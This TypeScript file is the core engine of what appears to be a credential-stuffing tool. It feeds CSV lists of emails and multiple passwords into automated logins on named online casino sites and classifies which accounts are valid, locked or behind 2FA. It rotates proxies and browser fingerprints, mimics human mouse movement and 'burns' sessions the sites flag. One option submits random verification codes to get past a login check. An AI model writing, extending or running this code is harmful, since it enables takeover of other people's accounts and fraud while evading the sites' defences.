/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-expressions , @typescript-eslint/no-misused-promises, @typescript-eslint/ban-ts-comment, no-useless-assignment, @typescript-eslint/restrict-template-expressions, no-unassigned-vars, @typescript-eslint/no-require-imports*/
/**
 * AUTOMATION ENGINE
 * EventEmitter-based core that processes each CSV row.
 * Emits real-time events for the GUI server to relay over WebSocket.
 *
 * Login flow: smart response detection with multi-password retry sequences.
 * Response-based waits (networkidle + 500ms) instead of hardcoded timers.
 *
 * All types, classification, concurrency, and target logic is defined
 * inline in this file (canonical source of truth).
 */

import { EventEmitter } from "events";
import { CONFIDENT_OUTCOMES, saveFingerprintData, saveTestRun, advanceBatchIndex, getNextBatchIndex } from "./database.js";
import { AnalyticsAggregator, type BenchmarkReport } from "./analytics.js";

import { type Page } from "playwright-core";
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { createSession, PROXY_INFO, getProxyPoolSize, proxyScoreTracker, type SessionHandle, getActiveProxyPool } from "../../backends/index.js";
import { AgentObserver } from "../intelligence/agent-observer.js";
import { attachStaticCache } from "../services/static-cache.js";
import { preValidatePool } from "../proxy/proxy-pre-ping.js";
import type { MullvadSessionMode } from "../proxy/mullvad-session-adapter.js";
import { killOurOrphans } from "../services/process-cleaner.js";

import type { SpiderSettings } from "./spider-settings.js";
import { misdirectionDenylist, BurnedFingerprintError } from "./misdirection-denylist.js";
import { emailDenylist } from "./email-denylist.js";
import { codegenExporter } from "../services/codegen-exporter.js";
import { isVerificationAvailable, processVerificationJob, type VerificationJob } from "../services/video-verifier.js";
import "dotenv/config";
import { DEFAULT_TARGETS, TargetIgnition, TargetJoeFortune } from "../targets/index.js";
import type { SiteConfig } from "../targets/index.js";
export { DEFAULT_TARGETS, TargetIgnition, TargetJoeFortune };
export type { SiteConfig };
import { executeCurlRestFlow } from "./curl-backend.js";
import { getStaticCacheDir, wipeStaticCacheNamespaces, type StaticCacheScope } from "../stealth/static-cache.js";
import { getRotationEngine } from "../stealth/fingerprint-rotation-engine.js";
import { getBlender } from "../stealth/fingerprint-blender.js";

import { emailToFingerprintSeed } from "./crypto-utils.js";
import { ScreenshotService } from "../services/screenshot-service.js";
import { globalRLLedger } from "../intelligence/ai-rl-ledger.js";
import { gaussianClamped } from "./gaussian-rng.js";
import {
  classifyAccountEvidence,
  type CanonicalAccountOutcome,
  type SubmitAcceptanceEvidence,
} from "./account-classification.js";
import { humanMouseMove, injectMicroTremor, getSafeRestingPosition, humanClickAt, humanClickSelector } from "../intelligence/mouse-humanizer.js";
import { getTimeOfDayMultiplier } from "../services/time-profile.js";
import {
  detectLoginTrigger,
  clickShowPasswordCanonical,
  installLoginTriggerObserver,
  setupSubmitMutationObserver,
  waitForSubmitMutationResult,
  executeMultiTierSubmit,
} from "../targets/login-flow.js";
import {
  universalLoginFlow,
} from "../targets/universal-login.js";
import {
  resolveLoginSelectors as resolveLoginStepSelectors,
  type LoginDiscoveryVariant,
  type LoginEntryVariant,
  type LoginAcceptanceVariant,
  type ResolvedLoginSelectors,
  type SelectorDiscoveryProvenance,
} from "../targets/login-step-variants.js";
import { CookieGuard } from "../guards/cookie-guard.js";
import { SubmitButtonStateTracker } from "../guards/submit-tracker.js";
import { verifyLoginSuccessVisually } from "../hermes/visual-verifier.js";
import {
  maybePostSubmitScroll,
  simulateAutofill,
  simulateHumanClick,
  type SubmitMethod,
} from "../stealth/random-login-actions.js";

const honeypotBreaker = new Map<string, number[] | number>();
function getCircuitBreakerExpiry(targetName: string): number {
  const expiry = honeypotBreaker.get(targetName + "-ban");
  return typeof expiry === "number" ? expiry : 0;
}
import { DynamicTimings } from "./timings.js";
import { createLogger } from "./logger.js";
import { DarwinEngine, type DarwinScorecard } from "./darwin-engine.js";
import { hermesDarwinAnalyzer } from "../hermes/darwin-analyzer.js";
import { flowTracer } from "../services/flow-tracer.js";
import { FlowScreenshotter } from "../services/flow-screenshotter.js";
import { TimelineRecorder } from "../services/timeline-recorder.js";
import { TimelineAnalyzer } from "../hermes/timeline-analyzer.js";
import { hermesHealer } from "../hermes/self-healing.js";
import { recordSession } from "./session-telemetry.js";
import { analyzeInitialResponse, analyzePageResources } from "../intelligence/block-predictor.js";
import { injectDualClassifier } from "../intelligence/dom-classifier.js";
import { getHermesObserver } from "../hermes/hermes-observer.js";

const csvLog = createLogger("CSV");
const engineLog = createLogger("Engine");
// ─── Types ────────────────────────────────────────────────────────────────────

// Global static asset cache for CSS/JS response caching
interface CachedAsset {
  body: Buffer;
  contentType: string;
  headers: Record<string, string>;
  timestamp: number;
}
const staticAssetCache = new Map<string, CachedAsset>();
const MAX_CACHE_SIZE = 150; // Max number of assets to keep in memory

export interface Credential {
  email: string;
  passwords: string[];  // All passwords from CSV columns in order (B, C, D, E, F, G, ...)
  isGolden?: boolean;
  target_sites?: string[];
}

export interface RepairStep {
  run(selector: string): Promise<void>;
}

export interface CredentialFieldDriver {
  readValue(selector: string): Promise<string | undefined>;
  repairPlan(value: string): RepairStep[];
  shouldAbort?(): Promise<boolean>;
}

async function safeCloseSession(handle: any) {
  let timer: NodeJS.Timeout;
  let browserPid: number | undefined;

  // Extract PID for zombie killer
  try {
    if (handle.page && typeof handle.page.context === 'function') {
      const browser = handle.page.context().browser();
      if (browser) {
        browserPid = browser.process()?.pid;
      }
    }
  } catch {
    // Ignore extraction errors
  }

  // -----------------------------------------------

  await Promise.race([
    handle.close(),
    new Promise(r => { timer = setTimeout(r, 3000); })
  ]).catch(() => { });
  clearTimeout(timer!);

  // Fix Gap 4: Zombie Browser Processes
  // Force kill the specific browser process to prevent memory leaks over days of execution
  if (browserPid) {
    try {
      if (process.platform === "win32") {
        require("child_process").execSync(`taskkill /pid ${browserPid} /T /F`, { stdio: "ignore" });
      } else {
        process.kill(-browserPid, 'SIGKILL'); // Kill process group
      }
    } catch {
      try {
        process.kill(browserPid, 'SIGKILL'); // Fallback to single PID
      } catch {
        // Process already gracefully exited
      }
    }
  }

  if (global.gc) {
    try { global.gc(); } catch { /* intentional */ }
  }
}

// ── BACKEND_OPTIMAL_SETTINGS — Now separated into per-backend profile files ──
// See backends/profiles/ for per-backend desktop and mobile configurations.
// Import for local use AND re-export for external consumers.
import { BACKEND_OPTIMAL_SETTINGS as _BACKEND_OPTIMAL_SETTINGS, BACKEND_MOBILE_SETTINGS as _BACKEND_MOBILE_SETTINGS, resolveBackendSettings as _resolveBackendSettings } from '../../backends/profiles/index.js';

import { IdleWatchdog } from "./idle-watchdog.js";
import { TempDisabledScheduler } from "./temp-disabled-scheduler.js";

export const BACKEND_OPTIMAL_SETTINGS = _BACKEND_OPTIMAL_SETTINGS;
export const BACKEND_MOBILE_SETTINGS = _BACKEND_MOBILE_SETTINGS;
export const resolveBackendSettings = _resolveBackendSettings;
export type Outcome =
  | "queued"
  | "testing"
  | "success"        // Login flow completed — "VERIFY YOUR PHONE"/"+61" or other terminal success signal
  | "success-unconfirmed" // Login success detected but cashier verification bounced
  | "2FA"            // "AUTHENTICATOR" popup detected — credential is valid, second factor required
  | "noaccount"      // ≥1 password submitted, all attempts incorrect, cashier bounced
  | "permdisabled"   // "been disabled" detected — permanent
  | "tempdisabled"   // "temporarily disabled" — 1hr cooldown
  | "skipped"        // Zero passwords submitted this run (no-creds / cooldown).
  | "inconclusive"   // Attempts occurred, but accepted-submit or synchronized evidence was insufficient/conflicting.
  //   The reason is carried in SiteStatus.error.
  //   Distinct from "noaccount": no authentication was ever attempted.
  | "N/A"            // Session/page crash
  | "incorrect"      // Password incorrect but account exists
  | "pin-misdirection" // Update your pin misdirection
  | "blocked"        // WAF or hard block
  | "soft_success_failed_cashier" // Blueprint: Login looked successful but cashier bounce disproved it
  | "honeypot";      // Upgrade 6: Identity Verification/Honeypot detected

// Blueprint Q6: Multi-Level Toxic Burn Protocol
// ─────────────────────────────────────────────────────────────────────────────
// Level 1 (CLEAN): Session pooled for reuse, no cleanup needed
//   - queued, testing
// Level 2 (SOFT): Cookie-clear only — session stays alive, no proxy rotation
//   Blueprint golden rule: "NEVER close the browser context — just clear cookies"
//   - noaccount, incorrect, success-unconfirmed, soft_success_failed_cashier, pin-misdirection, skipped
// Level 3 (HARD): Full session destruction + proxy rotation
//   - success, 2FA, permdisabled, tempdisabled, honeypot, blocked, N/A, misdirection
// ─────────────────────────────────────────────────────────────────────────────
// eslint-disable-next-line @typescript-eslint/no-redundant-type-constituents
const SOFT_TOXIC_OUTCOMES: ReadonlySet<Outcome | string> = new Set([
  "noaccount",
  "incorrect",
  "success-unconfirmed",
  "soft_success_failed_cashier",
  "pin-misdirection",
  "skipped",
  "inconclusive",
]);

type ToxicLevel = "clean" | "soft" | "hard";

/** Returns the toxic level for the row's combined site outcomes.
 *  - "clean": all sites returned non-actionable outcomes (queued/testing)
 *  - "soft":  worst outcome is a soft-toxic (cookie-clear, keep session)
 *  - "hard":  at least one hard-toxic outcome (destroy session + rotate)
 *  If burnOnlyOnPermDisabled is true, ONLY permdisabled triggers "hard". */
function classifyToxicLevel(sites: Record<string, SiteStatus>, burnOnlyOnPermDisabled?: boolean, recycleSessionOnIncorrect?: boolean): ToxicLevel {
  let maxLevel: ToxicLevel = "clean";
  for (const s of Object.values(sites)) {
    if (s.outcome === "queued" || s.outcome === "testing") continue;
    if (burnOnlyOnPermDisabled) {
      if (s.outcome === "permdisabled") return "hard";
      continue;
    }
    // Misdirection stored in error string is always hard
    if (s.error?.startsWith("misdirection:")) return "hard";
    // recycleSessionOnIncorrect keeps noaccount clean (legacy compat)
    if (recycleSessionOnIncorrect && s.outcome === "noaccount") continue;
    // Soft outcomes: cookie-clear only, keep session
    if (SOFT_TOXIC_OUTCOMES.has(s.outcome)) {
      if (maxLevel === "clean") maxLevel = "soft";
      continue;
    }
    // Everything else is hard toxic
    return "hard";
  }
  return maxLevel;
}

// Legacy compat wrapper — returns true for any non-clean level
// eslint-disable-next-line @typescript-eslint/no-unused-vars
function _hasAnyToxicOutcome(sites: Record<string, SiteStatus>, burnOnlyOnPermDisabled?: boolean, recycleSessionOnIncorrect?: boolean): boolean {
  return classifyToxicLevel(sites, burnOnlyOnPermDisabled, recycleSessionOnIncorrect) !== "clean";
}

// Maximum rows a single session can serve before forced rotation
// (prevents long-lived fingerprint correlation)
const SESSION_REUSE_MAX_ROWS = 8;
// Maximum age in ms before a session is force-rotated (5 minutes)
const SESSION_REUSE_MAX_AGE_MS = 5 * 60 * 1000;

/** Shared session pool keyed by concurrency worker slot ID. */
interface PooledSession {
  handle: SessionHandle;
  proxyKey: string;
  proxyServer: string;
  createdAt: number;
  rowsProcessed: number;
  backend: string;
}
const workerSessionPool = new Map<number, PooledSession>();
/** Tracks which concurrency slots are currently occupied. */
const activeWorkerSlots = new Set<number>();

export interface SiteStatus {
  outcome: Outcome;
  attempts: number;
  error?: string;
  canonicalOutcome?: CanonicalAccountOutcome;
  submitEvidence?: SubmitAcceptanceEvidence[];
  evidenceRunId?: string;
  selectorProvenance?: SelectorDiscoveryProvenance;
  entryVariant?: LoginEntryVariant;
  acceptanceVariant?: LoginAcceptanceVariant;
}

export interface RowStatus {
  rowIndex: number;
  email: string;
  isVip?: boolean; // Assigned to 5% of credentials for VIP Warm Pool A/B testing
  status: "queued" | "testing" | "done" | "skipped" | "tempdisabled";
  sites: { [siteName: string]: SiteStatus };
  sessionId?: string;
  recordingUrl?: string;
  tracePath?: string;
  cdpEvidencePath?: string;
  evidenceManifestPath?: string;
  backend?: string;
  currentBatch: number;            // which batch of 3 passwords (0-indexed)
  scheduledRetestAt?: string;      // ISO timestamp — retest with next batch after cooldown
  target_sites?: string[];
  aiVerified?: {                   // AI video verification result (populated post-run)
    verified: boolean;             // true = AI reviewed the recording
    siteResults: {
      [siteName: string]: {
        aiVerdict: string;
        confidence: string;
        matches: boolean;
        reasoning: string;
      }
    };
  };
  runContext?: {
    ipAddress?: string;
    fingerprintInfo?: string;
    deviceType?: string;
  };
}

function persistFinalizedSessionArtifacts(row: RowStatus, handle: SessionHandle): void {
  if (handle.recordingUrl) row.recordingUrl = handle.recordingUrl;
  if (handle.traceFinalized === true && handle.tracePath) row.tracePath = handle.tracePath;
  if (handle.cdpEvidenceFinalized === true && handle.cdpEvidencePath) row.cdpEvidencePath = handle.cdpEvidencePath;
}

export interface ExperimentalConfig {
  backend: string;
  proxyPool: string;
  fails: number;
  blocks: number;
  decisive: number;
  eliminated: boolean;
  totalAttempts: number;
  totalDurationMs: number;
  errors: Record<string, number>;
  fpStrategy?: import("../profiles/profile-useragent.js").FpStrategy;
  inputMode?: "instant" | "fast-human" | "chrome-autofill";
  enableCacheInjection?: boolean;
}

export interface EngineConfig {

  concurrency: number;
  maxRetries: number;
  targets: SiteConfig[];
  resume?: boolean;             // load progress.json on start; skip already-completed rows
  backend?: "spider" | "spider-cloud" | "spider-local" | "cloak-headed" | "cloak-headless" | "cloak-headless-nocloak" | "cloak-headed-nocloak" | "experimental" | "experimental-elimination" | "curl-api" | "golden-benchmark" | "stealth" | "stealth-headed" | "stealth-httpcloak" | "zendriver" | "zendriver-headed" | "rotate-backends" | "rotate-backends-headless";
  experimentalModeType?: string;
  spiderApiKey?: string;        // required when backend === "spider-cloud" (legacy "spider" normalises there)
  spiderLocalApiKey?: string;   // required when backend === "spider-local"
  spiderSettings?: SpiderSettings;
  liveTest?: boolean;           // true → headed single-credential dry run; engine emits a banner so the live log is easy to scan
  enableCacheInjection?: boolean; // inject deterministic localStorage breadcrumbs via addInitScript; default FALSE (Rule 38: addInitScript hooks add detectable surface)
  postLoadDelay?: number;       // seconds to wait after page load before beginning interactions
  recordVideo?: boolean;        // local Cloak video capture; dashboard-toggleable for live and batch runs
  enablePlaywrightTracing?: boolean;
  evidenceMode?: boolean;       // requires continuous video + tracing + coordinate + verifier instrumentation before canonical PASS
  primarySubmitVariation?: SubmitMethod; // fixed matrix-cell starting variation; later invocations rotate deterministically
  loginDiscoveryVariant?: LoginDiscoveryVariant;
  loginEntryVariant?: LoginEntryVariant;
  loginAcceptanceVariant?: LoginAcceptanceVariant;
  dryRun?: boolean;             // executes no live classification action; canonical outcomes always remain inconclusive
  cleanSession?: boolean;       // local Cloak uses a fresh disposable profile; default true to avoid test/session carryover
  enableVerification?: boolean; // AI video verification for double-bad outcomes; default true when API key is set
  flowDebug?: boolean;          // step-by-step verified execution with halted flow on failure
  captureFlowSteps?: boolean;    // capture a screenshot at each named flow step for visual debugging
  proxyPool?: string;
  mullvadSessionMode?: MullvadSessionMode;
  /** Fail closed when a browser session cannot bind a usable proxy. Defaults
   *  to true whenever a non-off proxy pool is configured. */
  requireProxy?: boolean;
  disableIdleHangingLogic?: boolean; // toggle to skip long hangs via Hermes intervention
  recycleSessionOnIncorrect?: boolean; // session recycling on incorrect outcome
  /** A/B split evaluation: when set, even-indexed rows use splitBackends[0]
   *  and odd-indexed rows use splitBackends[1]. Both systems run concurrently
   *  within the same batch for direct comparison. Overrides `backend`. */
  splitBackends?: [string, string];
  fpStrategy?: import("../profiles/profile-useragent.js").FpStrategy;
  emulateMobile?: boolean; // independent mobile emulation layer overriding OS to android
  /** Country-code hint passed through to createSession for proxy routing;
   *  cloak-backend currently treats this as a soft override hook. */
  proxyCountry?: string;
  /** BCP-47 locale override passed through to createSession; cloak-backend
   *  currently coerces non-AU values back to "en-AU". */
  locale?: string;
  /** Request-mode hint (e.g. "stealth-max", "fast") forwarded to createSession
   *  for downstream launch-flag tuning. */
  requestMode?: string;

  useHttpCloak?: boolean;
  stealthBypassHttpCloak?: boolean;
  httpcloakEch?: boolean;
  httpcloakTcpFingerprint?: boolean;
  injectStealthJS?: boolean;

  isExperimental?: boolean;
  experimentalConfigs?: ExperimentalConfig[];
  parallelSiteTesting?: boolean; // #48 parallel vs sequential site execution
  /** When true: on Ignition LOGIN VERIFICATION popup, submit a random 6-digit
   *  code, triple-click the confirm button, then re-attempt the same password
   *  as if the popup had returned "incorrect". Default false (legacy burn behaviour). */
  ignitionVerifBypass?: boolean;

  /** Ordered list of backends to rotate through in rotate-backends mode.
   *  Each credential row gets the next backend in round-robin order. */
  rotateBackendsList?: string[];

  /** Per-backend tracking for rotation modes — mirrors ExperimentalConfig
   *  to enable elimination, reporting, and auto-fix in ALL multi-backend modes. */
  rotationTracking?: ExperimentalConfig[];

  /** Number of fails/blocks before a rotation backend is eliminated.
   *  Varies by mode aggressiveness: Darwin/SpeedBlitz=3, Rotate=5, Recon=6. */
  rotationEliminationThreshold?: number;

  /** Human-readable label for the rotation mode (e.g. "🔄 Rotate All").
   *  Used in logs, reports, and dashboard events. */
  rotationModeName?: string;

  /** When true: if a fingerprint/misdirection is detected, the requeued
   *  credential automatically switches to a different backend to evade
   *  fingerprint correlation. Default false. */
  rotateOnFingerprint?: boolean;
  burnOnlyOnPermDisabled?: boolean;
  mutateOnRetry?: boolean;
  proxyRotateUrl?: string;
  manualCaptchaMode?: boolean;
  useVisionCoordinates?: boolean; // AI Viewport Coordinate Markdown (Singularity Upgrade #1)
  /** When true (default), each session in multi-backend rotation modes
   *  automatically receives optimal settings from the BACKEND_OPTIMAL_SETTINGS
   *  matrix (osProfile, concurrencyWeight, recordVideo, etc.).
   *  When false, all sessions use the global dashboard settings. */
  autoOptimizePerBackend?: boolean;
}

const SHADOW_DOM_TEXT_EXTRACTOR = `(() => {
  function walk(node) {
    let text = '';
    if (node.nodeType === 3) text += node.textContent + ' ';
    if (node.nodeType === 1) {
      if (node.shadowRoot) text += walk(node.shadowRoot);
      for (let child of node.childNodes) text += walk(child);
    }
    return text;
  }
  return walk(document.body || document.documentElement);
})()`;

// ─── Custom Errors ────────────────────────────────────────────────────────────

class PermDisabledError extends Error {
  constructor() {
    super("Account permanently disabled");
    this.name = "PermDisabledError";
  }
}

export class PreemptiveBlockError extends Error {
  constructor(msg?: string) {
    super(msg);
    this.name = "PreemptiveBlockError";
  }
}

class TempDisabledError extends Error {
  constructor() {
    super("Account temporarily disabled — 1hr cooldown");
    this.name = "TempDisabledError";
  }
}

// ─── Response Types ───────────────────────────────────────────────────────────

// Detection vocabulary is the project's only source of truth (per the
// operator-supplied trigger list). Each value maps 1:1 to a unique on-screen
// trigger word:
//   • "success"            — generic terminal-success signal (success class,
//                            form-vanished, or url-change away from /login).
//   • "verify-phone"       — VERIFY YOUR PHONE / +61 (terminal success; no
//                            cashier verification needed).
//   • "authenticator"      — AUTHENTICATOR popup (terminal 2FA category).
//   • "pin-misdirection"   — UPDATE YOUR PIN / PIN UPDATE on joe or ignition.
//   • "ignition-verification" — LOGIN VERIFICATION popup on Ignition only.
//   • "incorrect" / "disabled" / "tempdisabled" — existing per-credential verdicts.
//   • "other" / "timeout"  — unclassified; advance to next password.
export type LoginResponse =
  | "success"
  | "success-unconfirmed"
  | "verify-phone"
  | "authenticator"
  | "pin-misdirection"
  | "ignition-verification"
  | "incorrect"
  | "disabled"
  | "tempdisabled"
  | "honeypot"
  | "cashier-bounce"
  | "other"
  | "timeout";

/**
 * Raw signals captured from a page snapshot. Pure data — gathered inside
 * page.evaluate() and then handed to `classifyLoginResponse` in Node so the
 * decision logic lives in exactly one place and is unit-testable.
 *
 *   • bodyText             — document.body.innerText, untouched casing.
 *   • passwordPresent      — password input still in the DOM.
 *   • urlMoved             — location.pathname differs from the original
 *                            login pathname. Either of {passwordPresent=false,
 *                            urlMoved=true} flips the phase gate on.
 *   • hasSuccessSelector   — SUCCESS_SELECTOR present anywhere in the DOM.
 *   • submitGone           — submit button removed from the DOM.
 */
export interface LoginSignals {
  bodyText: string;
  passwordPresent: boolean;
  urlMoved: boolean;
  hasSuccessSelector: boolean;
  submitGone: boolean;
  alertPresent: boolean;
  promoPresent?: boolean;
}

/**
 * Pure classifier: maps observed page signals to a LoginResponse using the
 * source-of-truth trigger words. Lives outside the engine class so unit
 * tests can drive it directly without spinning up a browser.
 *
 * Ordering is significant and matches the source-of-truth spec:
 *   1. "AUTHENTICATOR"                         → "authenticator"
 *   2. "VERIFY YOUR PHONE" / "+61"             → "verify-phone"
 *   3. "UPDATE YOUR PIN" / "PIN UPDATE"        → "pin-misdirection"
 *   4. (ignition only) "LOGIN VERIFICATION"    → "ignition-verification"
 *   5. SUCCESS_SELECTOR present                → "success"
 *   6. form vanished (password + submit gone)  → "success"
 *   7. per-credential phrases (disabled / tempdisabled / incorrect)
 *
 * The four screen triggers are PHASE-GATED on the login form having
 * actually changed state (password input gone OR URL moved off /login).
 * This prevents static page chrome — header / footer with a customer
 * support "+61 ..." number, "verification" marketing copy, etc. — from
 * firing a verdict before the credential has even been submitted.
 */
export function classifyLoginResponse(signals: LoginSignals, siteName: string): LoginResponse {
  const lower = signals.bodyText.toLowerCase();

  // Upgrade 7 & Core Key String Detection (Highest Priority)
  // Check tempdisabled FIRST so phrases like "has been disabled temporarily" don't get
  // misclassified as permdisabled by a loose "been disabled" match.
  if (
    lower.includes("temporarily disabled") ||
    lower.includes("too many failed attempts") ||
    lower.includes("locked out") ||
    lower.includes("try again in") ||
    lower.includes("try again later") ||
    lower.includes("too many attempts")
  ) {
    return "tempdisabled";
  }

  // Permdisabled check
  if (
    lower.includes("permanently disabled") ||
    lower.includes("account closed") ||
    lower.includes("been disabled") ||
    lower.includes("account suspended") ||
    lower.includes("no longer active")
  ) {
    return "disabled";
  }

  // Upgrade 6: Honeypot Detection
  if (lower.includes("under review") || lower.includes("upload identity")) return "honeypot";

  // Fast Retry Signal: Detection of the alert content often indicates a rejected attempt.
  if (signals.alertPresent) return "incorrect";
  if (lower.includes("incorrect")) return "incorrect";

  const formChanged = !signals.passwordPresent || signals.urlMoved;
  const trigger = detectLoginTrigger(signals.bodyText, siteName);
  if (trigger === "ignition-verification" && siteName === "ignition") return "ignition-verification";

  if (formChanged) {
    if (signals.promoPresent) return "success";
    if (trigger === "authenticator") return "authenticator";
    if (trigger === "verify-phone") return "verify-phone";
    if (trigger === "pin-misdirection") return "pin-misdirection";
  }

  if (signals.hasSuccessSelector) return "success";

  // Fast-path success indicator: "Welcome!" banner (exclamation mark required).
  // IMPORTANT: All three success signals above (promoPresent, hasSuccessSelector,
  // /welcome!/i) are INITIAL success indicators only. Returning "success" here
  // commands the wrapper to navigate to the cashier page for confirmation. The
  // outcome is not finalized until the cashier verification completes.
  if (/welcome!/i.test(signals.bodyText)) return "success";

  return "other";
}

/**
 * executeLoginFlow result.
 *
 *   • `misdirection.trigger` records which unique trigger word fired the
 *     burn — "UPDATE YOUR PIN" / "PIN UPDATE" on joe + ignition, OR
 *     "LOGIN VERIFICATION" on ignition after the second occurrence in a single
 *     credential session. The caller burns the fingerprint seed + proxy
 *     sticky session and wipes the static cache.
 *   • `requeueCredential` asks the row-level loop to put the credential
 *     back into the queue so a fresh fingerprint/IP can retest it.
 *   • `reason` carries machine-readable detail for non-attempt outcomes
 *     ("skipped" with no-creds / cooldown).
 *   • `bypassCashierVerification` marks an outcome as terminal-without-cashier
 *     so the wrapper does NOT navigate to verifyUrl after the inner flow
 *     returns. Used by the "VERIFY YOUR PHONE" / "+61" path — per the
 *     source-of-truth spec that screen IS the terminal success state and
 *     does not need (and cannot pass) a cashier reachability check.
 */
export interface LoginFlowResult {
  outcome: Outcome;
  attempts: number;
  misdirection?: { url: string; trigger: string };
  requeueCredential?: boolean;
  reason?: string;
  bypassCashierVerification?: boolean;
  canonicalOutcome?: CanonicalAccountOutcome;
  submitEvidence?: SubmitAcceptanceEvidence[];
  selectorProvenance?: SelectorDiscoveryProvenance;
  entryVariant?: LoginEntryVariant;
  acceptanceVariant?: LoginAcceptanceVariant;
}

/**
 * Pure predicate: should the executeLoginFlow wrapper run cashier
 * verification on this result? Centralises the three independent guards so
 * the decision is unit-testable without spinning up a Page.
 *
 *   1. Outcome must be "success" (sanity-check) or "noaccount" (potential
 *      hidden-success upgrade). Every other outcome short-circuits.
 *   2. `bypassCashierVerification` short-circuits when the outcome is a
 *      terminal success on a pre-cashier screen — currently only
 *      VERIFY YOUR PHONE / +61. Those screens cannot pass a cashier
 *      reachability check because the user is not yet authenticated past
 *      the phone-verify gate, so navigating to verifyUrl would bounce
 *      back to /login and produce a misleading "unconfirmed" record.
 *   3. `alreadyVerifiedSite` matches the current site → cashier ran
 *      earlier in the flow (mid-flow root-redirect confirmation) and
 *      already captured its canonical screenshot; running again would
 *      duplicate the visual record and waste a navigation.
 */
export function shouldRunCashierVerification(
  result: Pick<LoginFlowResult, "outcome" | "bypassCashierVerification">,
  siteName: string,
  alreadyVerifiedSite: string | null | undefined,
): boolean {
  if (result.bypassCashierVerification) return false;
  if (result.outcome !== "success" && result.outcome !== "noaccount") return false;
  if (alreadyVerifiedSite === siteName) return false;
  return true;
}

// Proxy/network failure detection — these errors indicate the proxy/session is
// unusable, not that the login flow itself failed. Bubble them to the outer
// proxy-retry loop instead of marking the site N/A.
function isProxyOrNetworkError(err: unknown): boolean {
  // eslint-disable-next-line @typescript-eslint/no-base-to-string
  const msg = (err instanceof Error ? err.message : String(err || "")).toLowerCase();
  return (
    msg.includes("net::err_aborted") ||
    msg.includes("net::err_connection_") ||
    msg.includes("net::err_tunnel_connection_failed") ||
    msg.includes("net::err_proxy_connection_failed") ||
    msg.includes("net::err_proxy_") ||
    // Upstream proxy 407 (Proxy Authentication Required). Chromium surfaces this
    // as ERR_INVALID_AUTH_CREDENTIALS; treat as a doomed-proxy failure so the
    // row-level retry loop rotates to a fresh proxy instead of marking the row
    // N/A with no proxy reputation update.
    msg.includes("err_invalid_auth_credentials") ||
    msg.includes("net::err_timed_out") ||
    msg.includes("net::err_socket_") ||
    msg.includes("net::err_empty_response") ||
    msg.includes("net::err_name_not_resolved") ||
    msg.includes("net::err_ssl_") ||
    msg.includes("net::err_cert_") ||
    msg.includes("target page, context or browser has been closed") ||
    msg.includes("browser has been closed") ||
    (msg.includes("websocket") && msg.includes("closed")) ||
    msg.includes("page crashed")
  );
}

// Success indicator: this CSS class appears in an alert when login succeeds.
// Combined with URL change away from /login, it's the primary success signal.
const SUCCESS_SELECTOR = ".ol-alert__content--status_success";

// Per-row proxy retry: how many fresh proxies to try before giving up the row.
const MAX_PROXY_RETRIES = 4;

// Live-test sidecars. Separate from the batch-run files so live-test segments
// (multiple sequential engine.start() invocations with different credentials)
// accumulate instead of clobbering each other — and so production batch
// state isn't corrupted by ad-hoc operator testing. B1 fix.

// Proxy reputation sidecar — loaded at engine construction, persisted at
// end-of-run. Captures cross-run history so quarantined proxies remain
// quarantined after a restart.
const PROXY_SCORES_FILE = "proxy-scores.json";

// Misdirection denylist sidecar — loaded at engine construction, persisted
// the moment a burn fires AND at end-of-run. Fingerprint seeds + proxy sticky
// sessions (`server#username`) hit by a PIN-update misdirection (joe +
// ignition) or a repeat Ignition LOGIN VERIFICATION fingerprint are permanently
// disabled from future sessions across restarts without quarantining sibling
// sticky sessions on the same gateway.
const MISDIRECTION_DENYLIST_FILE = "misdirection-denylist.json";

// Pending-requeue sidecar — keyed by email (indexes change across runs because
// rows are re-loaded from CSV) so a crash between the misdirection-denylist
// save and the in-memory requeue marker doesn't leave the proxy burned with
// no record of which credential still needs a retest. Persisted in the SAME
// code paths that save the misdirection denylist so the two stay coherent.
const REQUEUE_PENDING_FILE = "requeue-pending.json";

// Email denylist sidecar — loaded at engine construction, persisted the
// moment an account is auto-burned AND at end-of-run. Credentials added here
// are filtered out of every subsequent run (CSV load + start()-time defensive
// check). Operators can also hand-edit the JSON to add accounts they know
// are dead. Gitignored so it survives code updates.

const CUSTOM_TARGETS_FILE = "custom-targets.json";

/** Load custom targets from disk and merge with defaults */
export function loadAllTargets(): SiteConfig[] {
  let targets = JSON.parse(JSON.stringify(DEFAULT_TARGETS)) as SiteConfig[];
  if (fs.existsSync(CUSTOM_TARGETS_FILE)) {
    try {
      const custom = JSON.parse(fs.readFileSync(CUSTOM_TARGETS_FILE, "utf-8"));
      if (Array.isArray(custom)) {
        targets = [...targets, ...custom];
      }
    } catch { /* ignore malformed custom targets */ }
  }
  return targets;
}

// Concurrency policy: default 3, absolute max 20 (× 2 sites = 40 max sessions)
const DEFAULT_CONCURRENCY = 3;
function getMaxConcurrencyForBackend(backend?: string): number {
  if (!backend) return 12;
  const opt = BACKEND_OPTIMAL_SETTINGS[backend];
  if (opt?.maxConcurrency && typeof opt.maxConcurrency === "number") {
    return opt.maxConcurrency;
  }
  if (backend.includes("headed")) {
    const cols = parseInt(process.env.HEADED_GRID_COLS || "2", 10);
    const rows = parseInt(process.env.HEADED_GRID_ROWS || "2", 10);
    return Math.max(1, cols * rows);
  }
  if (backend.includes("cloud") || backend.includes("rest")) return 20;
  return 12; // local headless
}

// Dynamic concurrency tuning
const WARMUP_ROWS = 5;                 // process this many rows at concurrency=1 before ramping up
const FAILURE_WINDOW = 10;             // look at last N completed rows to gauge failure rate
const FAILURE_THROTTLE_THRESHOLD = 0.5;  // throttle back to 1 if failure rate exceeds this
const FAILURE_RAMPUP_THRESHOLD = 0.3;    // ramp to target only if failure rate stays below this
// Hysteresis: once a failure-driven throttle-down to 1 fires, require this many
// subsequent row completions in the calm zone before the throttler is allowed
// to ramp back up. Prevents single-row flapping between 1 and target. Gates
// the ramp-up branch only — warmup ramp-up is unaffected.
const THROTTLE_HOLD_ROWS = 5;

// emailToSeed lives in crypto-utils.ts as emailToFingerprintSeed (single source of truth).

/** Dynamic-resize semaphore. pLimit can't change its concurrency mid-run; this can. */
class DynamicLimit {
  private active = 0;
  private waiters: Array<() => void> = [];
  private _max: number;
  private log?: (level: "WARN" | "INFO", msg: string) => void;
